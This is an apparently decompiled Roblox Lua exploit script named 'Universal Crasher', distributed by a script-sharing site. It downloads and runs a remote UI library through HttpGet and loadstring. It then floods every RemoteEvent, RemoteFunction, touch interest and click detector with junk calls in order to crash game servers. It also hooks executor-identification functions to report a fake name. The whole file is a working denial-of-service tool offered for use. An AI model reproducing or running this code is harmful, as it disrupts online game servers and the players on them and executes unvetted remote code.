-- This file was generated at discord.gg/syncrypt

local function v1(...)
	return {
		...,
		n = select("#", ...),
	}
end

game:GetService("ReplicatedStorage")
game:GetService("Workspace")
game:GetService("Players")
game:GetService("UserInputService")
game:GetService("RunService")

local LocalPlayer = game.Players.LocalPlayer;

(LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
game:GetService("ReplicatedStorage")
game:GetService("Players")
local v4 = v1(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Lib/main/source.lua"))
local v5 = loadstring(unpack(v4, 1, v4.n))():Window("Universal Crasher")

getgenv().RemoteSpamEnabled = false
getgenv().TouchClickSpamEnabled = false
getgenv().SpamRate = 100

local thread = nil
local thread2 = nil
local t1 = {}
local t2 = {}
local t3 = {}
local t4 = {}

local function v12()
	t1 = {}
	t2 = {}

	local function v13(p1)
		for _, descendant in ipairs(p1:GetDescendants()) do
			if descendant:IsA("RemoteEvent") then
				table.insert(t1, descendant)
			elseif descendant:IsA("RemoteFunction") then
				table.insert(t2, descendant)
			end
		end
	end

	v13(game:GetService("ReplicatedStorage"))
	v13(game)
	print("Collected " .. #t1 .. " RemoteEvents & " .. #t2 .. " RemoteFunctions")
end
local function v18()
	t3 = {}
	t4 = {}

	local function v19(p2)
		for _, descendant in ipairs(p2:GetDescendants()) do
			if descendant:IsA("TouchInterest") then
				table.insert(t3, descendant)
			elseif descendant:IsA("ClickDetector") then
				table.insert(t4, descendant)
			end
		end
	end

	v19(workspace)
	v19(game)
	print("Collected " .. #t3 .. " TouchInterests & " .. #t4 .. " ClickDetectors")
end

v5:Slider("Spam Rate", 50, 1000, 100, function(p3)
	getgenv().SpamRate = p3
end)
v5:Toggle("Server Crasher (Remotes)", false, function(p4)
	getgenv().RemoteSpamEnabled = p4

	if p4 then
		v12()

		if thread then
			task.cancel(thread)
		end

		thread = task.spawn(function()
			while getgenv().RemoteSpamEnabled do
				local v24 = 1 / getgenv().SpamRate
				local v25, v26, v27 = ipairs(t1)

				while true do
					local v28

					v27, v28 = v25(v26, v27)

					if v27 == nil or not getgenv().RemoteSpamEnabled then
						break
					end

					local pcall_ = pcall
					local v30 = v28

					pcall(function()
						v30:FireServer()
						v30:FireServer("")
						v30:FireServer(1)
						v30:FireServer({})
						v30:FireServer(game.Players.LocalPlayer)
						local v32 = (function(...)
							return {
								...,
								n = select("#", ...),
							}
						end)(tick())

						unpack(v32, 1, 1)
						v30:FireServer(unpack(v32, 1, v32.n))
					end)
				end

				local v33, v34, v35 = ipairs(t2)

				while true do
					local v36

					v35, v36 = v33(v34, v35)

					if v35 == nil or not getgenv().RemoteSpamEnabled then
						break
					end

					local pcall_ = pcall
					local v38 = v36

					pcall(function()
						v38:InvokeServer()
						v38:InvokeServer("")
						v38:InvokeServer(1)
						v38:InvokeServer({})
					end)
				end

				task.wait(v24)
			end
		end)

		return
	end

	if not thread then
		return
	end

	task.cancel(thread)
	thread = nil
end)
v5:Toggle("Use Touch Interests", false, function(p5)
	getgenv().TouchClickSpamEnabled = p5

	if p5 then
		v18()

		if thread2 then
			task.cancel(thread2)
		end

		thread2 = task.spawn(function()
			while getgenv().TouchClickSpamEnabled do
				local v39 = 1 / getgenv().SpamRate
				local v40, v41, v42 = ipairs(t3)

				while true do
					local v43

					v42, v43 = v40(v41, v42)

					if v42 == nil or not getgenv().TouchClickSpamEnabled then
						break
					end

					local pcall_ = pcall
					local v45 = v43

					pcall(function()
						if not (v45.Parent and v45.Parent:IsA("BasePart")) then
							return
						end

						firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v45.Parent, 0)
						task.wait(0.01)
						firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v45.Parent, 1)
					end)
				end

				local v46, v47, v48 = ipairs(t4)

				while true do
					local v49

					v48, v49 = v46(v47, v48)

					if v48 == nil or not getgenv().TouchClickSpamEnabled then
						break
					end

					local pcall_ = pcall
					local v51 = v49

					pcall(function()
						v51:Fire()
						fireclickdetector(v51, 0)
						fireclickdetector(v51, 1)
					end)
				end

				task.wait(v39)
			end
		end)

		return
	end

	if not thread2 then
		return
	end

	task.cancel(thread2)
	thread2 = nil
end)
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then
		return
	end

	if input.KeyCode ~= Enum.KeyCode.RightControl then
		return
	end

	getgenv().RemoteSpamEnabled = false
	getgenv().TouchClickSpamEnabled = false

	if thread then
		task.cancel(thread)
	end

	if thread2 then
		task.cancel(thread2)
	end

	print("🛑 All Spammers STOPPED")
end)

local v52 = v1(Color3.fromRGB(127, 143, 166))

v5:Label("RBLXSCRIPTS.NET", unpack(v52, 1, v52.n))

local BindableFunction = Instance.new("BindableFunction")
local StarterGui = game:GetService("StarterGui")
local v59 = StarterGui

function BindableFunction.OnInvoke()
	if pcall(function()
		setclipboard("https://rblxscripts.net")
	end) then
		v59:SetCore("SendNotification", {
			Title = "rblxscripts",
			Text = "Copied to Clipboard",
			Icon = "rbxassetid://124263077114634",
			Duration = 5,
		})
	else
		v59:SetCore("SendNotification", {
			Title = "rblxscripts",
			Text = "Failed to Copy to Clipboard: Link: https://rblxscripts.net",
			Icon = "rbxassetid://124263077114634",
			Duration = 10,
		})
	end
end

StarterGui:SetCore("SendNotification", {
	Title = "rblxscripts",
	Text = "Thanks for using our Script\n You can find more at: rblxscripts.net",
	Icon = "rbxassetid://124263077114634",
	Duration = 10,
	Button1 = "Copy",
	Callback = BindableFunction,
})
getgenv().FakeExecutorName = "RBLXSCRIPTS MOGS ALL SHIT SITES"

local identifyexecutor_ = identifyexecutor

function identifyexecutor()
	return getgenv().FakeExecutorName
end
function getexecutorname()
	return getgenv().FakeExecutorName
end

pcall(function()
	hookfunction(identifyexecutor_, function()
		return getgenv().FakeExecutorName
	end)
end)
local v62 = v1(identifyexecutor())

print(unpack(v62, 1, v62.n))
